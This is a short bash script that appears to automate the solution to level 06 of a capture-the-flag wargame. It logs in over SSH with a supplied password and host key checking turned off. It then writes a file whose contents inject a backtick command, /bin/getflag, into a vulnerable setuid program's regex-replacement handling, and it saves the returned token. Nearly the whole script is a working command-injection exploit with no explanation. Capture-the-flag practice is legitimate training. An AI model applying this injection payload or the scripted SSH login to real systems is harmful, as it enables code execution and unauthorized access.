#!/usr/bin/env bash

SCRIPT=$(cat <<EOF
echo '[x \${\`/bin/getflag\`}]' > /tmp/flag06;
./level06 /tmp/flag06 2>&1 >/dev/null | awk 'NR==1 {print $NF}'
EOF
)

if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
	PASS=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level06@$1 -p $2 "$SCRIPT")
	PASS=$(echo $PASS | awk 'NR==1 {print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag06.pwd
else
	echo "Usage: ./flag06.sh <ip address> <port> <password>"
fi
